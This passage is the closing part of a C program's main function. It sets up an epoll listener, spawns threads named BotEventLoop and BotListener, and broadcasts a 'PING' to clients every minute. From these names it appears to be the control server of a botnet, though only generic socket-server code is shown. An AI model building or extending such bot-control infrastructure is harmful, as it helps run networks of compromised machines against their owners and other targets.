        }
        epollFD = epoll_create1 (0);
        if (epollFD == -1) {
			perror ("epoll_create");
			abort ();
        }
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1) {
			perror ("epoll_ctl");
			abort ();
        }
        pthread_t thread[threads + 2];
        while(threads--) {
			pthread_create( &thread[threads + 1], NULL, &BotEventLoop, (void *) NULL);
        }
        pthread_create(&thread[0], NULL, &BotListener, port);
        while(1) {
			broadcast("PING", -1, "LEL");
			sleep(60);
        }
        close (listenFD);
        return EXIT_SUCCESS;
}
